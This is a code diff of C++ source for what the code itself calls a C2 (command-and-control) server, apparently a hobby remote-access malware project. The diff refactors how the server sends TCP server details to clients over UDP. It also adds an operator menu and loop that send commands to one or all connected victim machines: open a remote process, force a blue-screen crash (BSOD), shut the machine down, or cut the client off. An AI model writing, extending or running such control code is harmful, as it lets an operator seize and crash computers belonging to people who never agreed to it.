@@ -25,7 +25,7 @@ ServerInterface::ServerInterface(int UDPPort, int TCPPort) {
  * Afterwords, clean up WSA.
  */
 ServerInterface::~ServerInterface() {
-	if ( IsServerRunning(this->m_TCPServerDetails) )
+	if ( this->m_TCPServerDetails.alive )
 		ShutdownServer(TRUE);
 
 	CleanWSA();
@@ -290,8 +290,6 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 		if ( onTCP ) // already connected
 			break;
 
-		Client UDPClient( req.tcp, incoming );
-
 		// client wants to connect so respond with tcp server details
 		hostent* host = GetHostByName(DNS_NAME.c_str());
 
@@ -303,11 +301,7 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 		std::cout << "[kConnectClient] : Good address. \n";
 		std::cout << "[kConnectClient] : Sending TCP server details. \n";
 
-		UDPMessage response;
-		response.isValid = TRUE;
-		response.TCPServer = temp;
-		if ( UDPSendMessageToClient(UDPClient, response) )
-			success = TRUE;
+		success = NetCommon::TransmitData(temp, this->m_UDPServerDetails.sfd, UDP, incoming);
 
 		if ( success )
 			std::cout << "[kConnectClient] : Sent TCP details. \n";
@@ -471,11 +465,6 @@ BOOL ServerInterface::HandleUserInput(unsigned int command, ServerCommand& outpu
 	case RemoteAction::kPingClient:
 		performed = TRUE;
 		break;
-	//case RemoteAction::kReturnPrivateRSAKey:
-	//case RemoteAction::kReturnPublicRSAKey:
-	//case RemoteAction::kSendPublicRSAKey:
-	//case RemoteAction::kUseCommandLineInterface:
-		//break;
 	}
 
 	if ( !performed )
@@ -492,10 +481,20 @@ BOOL ServerInterface::SendCommandsToClients() {
 	return TRUE;
 }
 
+void ServerInterface::OutputServerCommands() {
+	std::cout << "Showing possible server commands:\n";
+	std::cout << "\t" << kOpenRemoteProcess << ": Open a remote process.\n";
+	std::cout << "\t" << kPingClient << ": Send a ping to a remote host.\n";
+	std::cout << "\t" << kRemoteBSOD << ": Cause a BSOD on the client.\n";
+	std::cout << "\t" << kRemoteShutdown << ": Shutdown the clients machine.\n";
+	std::cout << "\t" << kKillClient << ": Forcefully disconnect the client from the C2 server.\n";
+}
+
 void ServerInterface::RunUserInputOnClients() {
 	while ( this->m_ClientList.size() <= 0 )
 		Sleep(100);
 
+	std::cout << "Running commands on remote hosts.\n";
 	while ( this->m_TCPServerDetails.alive && m_ClientList.size() > 0 ) {
 		// select which client to run command on
 		std::string clientID;	
@@ -503,13 +502,10 @@ void ServerInterface::RunUserInputOnClients() {
 		BOOL		  performed = FALSE;
 		ServerCommand performingCommand;
 
-		std::cout << "YOU ARE NOW RUNNING COMMANDS ON REMOTE HOSTS...\n";
-		std::cout << "Enter 'ClientID' of the remote host to perform commands on (0 for all): ";
-		//std::cin >> clientID;
+		std::cout << "[Client ID to perform command on; 0 for all]: ";
 		std::getline(std::cin, clientID);
 
-		// input number corrosponding to remote host command
-		//std::cout << "Input number corresponding to remote host command: ";
+
 		std::string command;
 		std::getline(std::cin, command);
 		std::cout << "Your input: " << command << std::endl;
@@ -722,17 +718,6 @@ ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
 	client->ExpectingResponse = FALSE;
 
 	return response;
-}
-
-/**
- * Send a message to a client over UDP.
- *
- * \param clientInfo - a 'Client' class with crucial details about the client filled out
- * \param message - the 'UDPMessage' structure to send over the socket
- * \return TRUE or FALSE depending if the message was sent or not
- */
-BOOL ServerInterface::UDPSendMessageToClient(Client clientInfo, UDPMessage& message) {
-	return NetCommon::TransmitData(message, this->m_UDPServerDetails.sfd, UDP, clientInfo.GetAddressInfo());
 }
 
 /**
